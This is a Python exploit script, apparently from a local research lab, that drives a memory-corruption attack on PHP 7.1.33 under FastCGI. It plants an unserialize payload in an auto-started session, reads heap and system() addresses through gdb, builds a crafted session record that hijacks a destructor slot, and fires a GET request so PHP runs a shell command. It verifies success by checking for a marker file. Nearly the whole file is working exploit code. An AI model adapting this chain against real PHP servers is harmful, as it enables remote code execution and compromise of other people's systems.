#!/usr/bin/env python3
"""7.1.33 auto_start variant: plain GET decodes T1 at RINIT, script flushes and
re-opens the session to decode T2 through the hijacked slot."""
import json, os, re, sys, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import lab

v = '7.1.33'
s = lab.info(v)
lab.stop(v)
time.sleep(0.2)
master, child = lab.start(v)
print('master=%d child=%d' % (master, child))

# probe + plant (auto_start session at RINIT, then unserialize plant)
st = lab.drv(v, 'probe')
print(re.search(r'PID=(\d+)', st).group(0))
out = lab.drv(v, 'plant', env={'PLANT_PAYLOAD': s['plant_payload']})
print(out[:160].replace('\n', ' '))
txt, _ = lab.gdb(v, 'state.gdb', phase='auto_state1.txt')
txts, _ = lab.gdb(v, 'sys.gdb', phase='auto_sys.txt')
sysaddr = int(lab.kv(txts, 'SYSTEM'), 16)
print('system=%#x' % sysaddr)
P = int(lab.kv(txt, 'BG_DATA'), 16)
B0 = int(lab.kv(txt, 'P_LAST_DTOR'), 16)
plast = int(lab.kv(txt, 'P_LAST') or 0, 16)
print('P=%#x B0=%#x plast=%#x level=%s used=%s' % (
    P, B0, plast, lab.kv(txt, 'BG_LEVEL'), lab.kv(txt, 'DTOR_USED')))

cmd = 'touch ' + s['marker'] + ';#'
key_len = ord(cmd[0])
key_text = cmd[1:]
X1 = int(os.environ.get('X1', '0x7ffff7a65000'), 16)
opts = dict(mode='final', zero=False, x1=X1, p=P, b0=B0, x2=0, cmd='',
            target=sysaddr, a_target=int(s['A'], 16),
            real_p=True, p_last=plast, key_len=key_len, key_text=key_text,
            no_frame=True)
m = lab.build(v, 'f7133', opts)
print('rec=%s' % {k: m[k] for k in ('rec1_len', 'L', 'payload_start', 'K')})

sys.path.insert(0, os.path.join(s['lab'], 'scripts'))
import fcgi
fcgi.init(os.path.join(s['lab'], 'www'), port=s['port'])


def get():
    return fcgi.request('trig.php', b'', None, cookie='PHPSESSID=f7133',
                        timeout=30, extra_params={'REQUEST_METHOD': 'GET',
                                                  'CONTENT_LENGTH': '0'})


txt, res = lab.gdb(v, 'final_system.gdb', get, phase='auto_final.txt', timeout=90)
print('\n'.join(l for l in txt.splitlines() if re.match(
    r'^(DECODE|SYSTEM|FLUSH|STOPPED|Program received|0x7f)', l)))
print('resp=%r' % (res['stdout'][:200] if res else None))
print('marker=%s worker_alive=%s master_alive=%s' % (
    os.path.exists(s['marker']), lab.alive(child), lab.alive(master)))
